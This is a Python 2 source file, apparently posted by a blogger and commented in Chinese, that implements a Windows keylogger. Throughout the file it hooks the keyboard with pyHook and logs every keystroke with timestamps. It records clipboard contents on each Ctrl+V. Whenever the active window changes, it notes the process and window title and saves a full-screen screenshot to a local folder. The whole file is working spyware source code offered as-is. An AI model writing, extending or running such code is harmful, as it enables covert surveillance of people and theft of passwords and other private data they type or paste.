#coding:gbk
__author__ = 'm9Kun'
__blog__ = 'm9kun.com'
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import win32gui
import win32ui
import win32con
import win32api
import time
import os
import os.path
import Image
import sys

def restart_program():  #重启程序
    python = sys.executable
    os.execl(python, python, * sys.argv)
def window_capture(dpath):
    ''''' 
截屏函数,调用方法window_capture('d:\\') ,参数为指定保存的目录 
返回图片文件名,文件名格式:日期.jpg 如:2009328224853.jpg 
    ''' 
    hwnd = 0 
    hwndDC = win32gui.GetWindowDC(hwnd)   
    mfcDC=win32ui.CreateDCFromHandle(hwndDC)   
    saveDC=mfcDC.CreateCompatibleDC()   
    saveBitMap = win32ui.CreateBitmap()   
    MoniterDev=win32api.EnumDisplayMonitors(None,None)  
    w = MoniterDev[0][2][2]  
    h = MoniterDev[0][2][3]  
    #print w,h　　　＃图片大小  
    saveBitMap.CreateCompatibleBitmap(mfcDC, w, h)   
    saveDC.SelectObject(saveBitMap)   
    saveDC.BitBlt((0,0),(w, h) , mfcDC, (0,0), win32con.SRCCOPY)  
    time_temp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    a1 = str(time_temp)[0:4]
    a2 = str(time_temp)[5:7]
    a3 = str(time_temp)[8:10]
    a4 = str(time_temp)[11:13]
    a5 = str(time_temp)[14:16]
    a6 = str(time_temp)[17:19]
    now_time = (a1+a2+a3+a4+a5+a6)
    bmpname = now_time+'.bmp'
    saveBitMap.SaveBitmapFile(saveDC, bmpname)  
    Image.open(bmpname).save(bmpname[:-4]+".jpg")  
    os.remove(bmpname)  
    jpgname=bmpname[:-4]+'.jpg' 
    djpgname=dpath+jpgname  
    copy_command = "move %s %s" % (jpgname, djpgname)  
    os.popen(copy_command)
    return bmpname[:-4]+'.jpg' 
    
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
    time_temp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    with open('.//Monitor//log.txt','a') as f:
        #获取最上层的窗口句柄
        hwnd = user32.GetForegroundWindow()
        #获取进程id
        pid = c_ulong(0)
        user32.GetWindowThreadProcessId(hwnd,byref(pid))
        #将进程id存入变量中
        process_id = '%s' % pid.value
        #申请内存
        executable = create_string_buffer('\x00'*512)
        h_process = kernel32.OpenProcess(0x400|0x10,False,pid)
        psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
        #读取窗口标题
        windows_title = create_string_buffer('\x00'*512)
        length = user32.GetWindowTextA(hwnd,byref(windows_title),512)
        #打印
        a1 = '[PID:%s - %s - %s]'%(process_id,executable.value,windows_title.value)
        print time_temp+':'+a1+'\r\n'
        f.write(time_temp+':'+a1+'\r\n')
        window_capture('.//Monitor//img//')
        #关闭handles
        kernel32.CloseHandle(hwnd)
        kernel32.CloseHandle(h_process)

#定义击键监听事件函数
def KeyStroke(event):
    global current_window
    time_temp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    #a1 = str(time_temp)[0:4]
    #a2 = str(time_temp)[5:7]
    #a3 = str(time_temp)[8:10]
    #a4 = str(time_temp)[11:13]
    #a5 = str(time_temp)[14:16]
    #a6 = str(time_temp)[17:19]
    #now_time = (a1+a2+a3+a4+a5+a6)
    with open('.//Monitor//log.txt','a') as f:
        #检测目标窗口是否转换（换了其它窗口就监听新的窗口）
        if event.WindowName != current_window:
            current_window = event.WindowName
            #函数调用
            get_current_process()
    
        #检测击键是否常规按键（非组合键等）
        if event.Ascii >32 and event.Ascii < 127:
            a2 = chr(event.Ascii)
            print time_temp+':[常规按键] '+a2+'\r\n'
            f.write(time_temp+':[常规按键] '+a2+'\r\n')
        else:
            #如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                #乱码的原因是复制的时候，使用的是英文输入法。
                
#解决方法：http://bbs.csdn.net/topics/80362400 [10楼]
                a3 = ' [键盘Ctrl+v粘贴事件,内容如下]\r\n%s' % pasted_value
                print time_temp + a3 + '\r\n'
                f.write(time_temp+':'+a3+'\r\n')
            else:
                a4 = "[%s]" % event.Key
                print time_temp+':[特殊按键] '+a4+'\r\n'
                f.write(time_temp+':[特殊按键] '+a4+'\r\n')
        #循环监听下一个击键事件
        return True

if not os.path.exists('.//Monitor//img'):
    os.makedirs('.//Monitor//img')
else:
    pass

#创建并注册hook管理器
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

#注册hook并执行
kl.HookKeyboard()
pythoncom.PumpMessages()
